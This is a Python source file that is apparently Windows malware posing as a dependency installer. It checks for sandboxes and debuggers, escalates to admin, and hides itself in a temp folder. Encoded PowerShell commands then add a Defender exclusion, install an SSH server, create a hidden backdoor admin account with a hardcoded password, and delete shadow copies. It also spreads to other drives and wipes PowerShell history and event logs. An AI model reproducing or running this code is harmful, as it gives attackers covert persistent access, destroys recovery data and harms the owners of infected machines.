from os import name
from sys import exit
from re import search
from subprocess import run
from ctypes import windll
from sys import executable
from sys import argv
from ctypes import c_bool
from ctypes import byref
from os import path
from os import environ
from os import remove
from os import mkdir
from shutil import move
from socket import gethostname
from socket import gethostbyname
from threading import Thread
from time import strftime
from time import gmtime
from platform import processor
from platform import platform
from platform import system
from platform import release
from platform import version
from platform import machine
from platform import win32_edition
from platform import architecture
from winreg import CreateKey
from winreg import HKEY_LOCAL_MACHINE
from winreg import SetValueEx
from winreg import REG_DWORD
from shutil import copy

def OperatingSystemCheck():
    if name != "nt":
        exit(1)


OperatingSystemCheck()

def VirtualMachineCheck():
    MPPREFERENCE = run("PoWeRsHeLl gEt-mPcOmPuTerStatUs", shell=True, capture_output=True).stdout.decode()
    if search("IsVirtualMachine                 : True", MPPREFERENCE):
        exit(1)


VirtualMachineCheck()

def DebuggerCheck():
    IsDebug = c_bool(False)
    windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), byref(IsDebug))
    if IsDebug == True:
        exit(1)

DebuggerCheck()

def RealTimeProtectionCheck():
    MPPREFERENCE = run("PoWeRsHeLl gEt-mPcOmPuTerStatUs", shell=True, capture_output=True).stdout.decode()
    if search("RealTimeProtectionEnabled        : True", MPPREFERENCE):
        windll.user32.MessageBoxW(0, "Real time protection must be disabled to install dependencies.", "Error",0x10)
        exit(1)


RealTimeProtectionCheck()

def IsUsrAdmin():
    if not windll.shell32.IsUserAnAdmin():
        windll.shell32.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
        exit(1)


IsUsrAdmin()

def HideOutCreation():
    if path.exists(environ['temp']+"\\0193") == False:
        mkdir(environ['temp']+"\\0193")
    windll.kernel32.SetFileAttributesW(environ['temp']+"\\0193", 2) # possible error

HideOutCreation()

def Hiding():
    MyCurrentLocation = path.basename(argv[0])
    if path.exists(environ['temp']+"\\0193\\"+MyCurrentLocation):
        remove(environ['temp']+"\\0193\\"+MyCurrentLocation)
    move(MyCurrentLocation, environ['temp']+"\\0193\\"+MyCurrentLocation)


Hiding()

def Logging():
    HostName1 = gethostname()
    HostnameString1 = HostName1
    with open(environ['temp']+"\\0193\\Log.txt", "w") as LogFile:
        LogFile.write("Date of execution(GMT): "+strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime())+"\n")
        LogFile.write("Hostname: "+HostnameString1+"\n")
        LogFile.write("Username: "+environ['username']+"\n")
        LogFile.write("Architecture: "+architecture()[0]+"\n")
        LogFile.write("Processor: "+processor()+"\n")
        LogFile.write("System: "+system()+"\n")
        LogFile.write("Platform: "+platform()+"\n")
        LogFile.write("Release: "+release()+"\n")
        LogFile.write("Version: "+version()+", "+version().split('.')[2]+"\n")
        LogFile.write("Machine: "+machine()+"\n")
        LogFile.write("Edition: "+win32_edition()+"\n")
        LogFile.close()
        
LOGTHREAD = Thread(target = Logging(), args = (10, ))
LOGTHREAD.start()

def HidingNewAdmin():
    KEY = CreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList")
    SetValueEx(KEY, "defaultuser0", 0, REG_DWORD, 0)
    KEY.Close()


HidingNewAdmin()


def Payload():
    run("pOWeRsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQBtAFAAcABSAGUARgBlAFIAZQBOAGMARQAgAC0AZQBYAGMATAB1AFMAaQBPAE4AcABBAHQASAAgACQAZQBuAHYAOgB0AD8APwBwAA=='", shell = True)
    #The run command above adds an exclusion to the temp folder using powershell..
    run("poWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQB3AEkAbgBEAG8AdwBTAGMAYQBQAGEAYgBpAGwAaQBUAHkAIAAtAE8AbgBMAGkATgBlACAALQBuAEEAbQBFACAAbwBwAEUAbgBTAHMASAAuAHMAZQByAHYAZQByAH4AfgB+AH4AMAAuADAALgAxAC4AMAA7ACAAcwBFAHQALQBzAEUAcgBWAGkAQwBlACAALQBuAEEAbQBFACAAUwBzAEgAZAAgAC0AcwBUAGEAcgBUAHUAUAB0AFkAcABFACAAIgBhAFUAdABPAG0AQQB0AEkAYwAiADsAIABzAFQAYQBSAHQALQBzAEUAcgBWAGkAQwBlACAAcwBTAGgARAA='", shell = True)
    #The run command above installs ssh server, starts ssh server and enables automatic ssh server startup using powershell.
    run("POwErsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'JABQAGEAcwBzAFcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAFAAYQBzAHMAVwAwAHIAZAAxAEAAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIABOAGUAdwAtAEwAbwBjAGEAbABVAHMAZQByACAALQBOAGEAbQBlACAAZABlAGYAYQB1AGwAdAB1AHMAZQByADAAIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAUABhAHMAcwBXAG8AcgBkADsAIABBAGQAZAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAEcAcgBvAHUAcAAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACIAIAAtAE0AZQBtAGIAZQByACAAZABlAGYAYQB1AGwAdAB1AHMAZQByADAA'", shell = True)
    #The run command above creates a new local admin with the username defaultuser0 and the password PassW0rd1@ using powershell.
    run("PowErSheLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'dgBzAHMAYQBkAG0AaQBuAC4AZQB4AGUAIABkAEUAbABFAHQARQAgAHMASABhAEQAbwBXAHMAIAAvAGEATABsACAALwBxAFUASQBlAFQA'", shell = True)
    #The run command above removes shadow copies using powershell.
    run("PowErSheLl ", shell = True)
    #Remove the safeboot reg key.


Payload()

LOGTHREAD.join()

def UsbDropper():
    DriveLetters = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "Y:", "X:", "Z:"]
    if environ['SystemDrive'] == environ['HomeDrive']:
        DriveLetters.remove(environ['SystemDrive'])
    else:
        DriveLetters.remove(environ['SystemDrive'])
        DriveLetters.remove(environ['HomeDrive'])
    for x in DriveLetters:
        try:
            copy("tester_usb.py", x+"\\")
        except FileNotFoundError:
            pass

        
UsbDropper()

def ClearPsCommandHistory():
    run("pOWERsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAGwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoAA=='", shell = True)
    #The run command above deletes the powershell command history file using powershell.

ClearPsCommandHistory()

def ClearingEventViewer():
    run("PoWeRsHElL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'RwBlAHQALQBXAGkAbgBFAHYAZQBuAHQAIAAtAEwAaQBzAHQATABvAGcAIAAqACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4AUgBlAGMAbwByAGQAQwBvAHUAbgB0AH0AIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAALQBQAHIAbwBjAGUAcwBzACAAewAgAFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBSAGUAYQBkAGUAcgAuAEUAdgBlAG4AdABMAG8AZwBTAGUAcwBzAGkAbwBuAF0AOgA6AEcAbABvAGIAYQBsAFMAZQBzAHMAaQBvAG4ALgBDAGwAZQBhAHIATABvAGcAKAAkAF8ALgBMAG8AZwBOAGEAbQBlACkAIAB9AA=='", shell = True)
    #The run command above deletes the event viewer logs.

ClearingEventViewer()


windll.user32.MessageBoxW(0, "Installation complete", "Success", 0x40)






























    
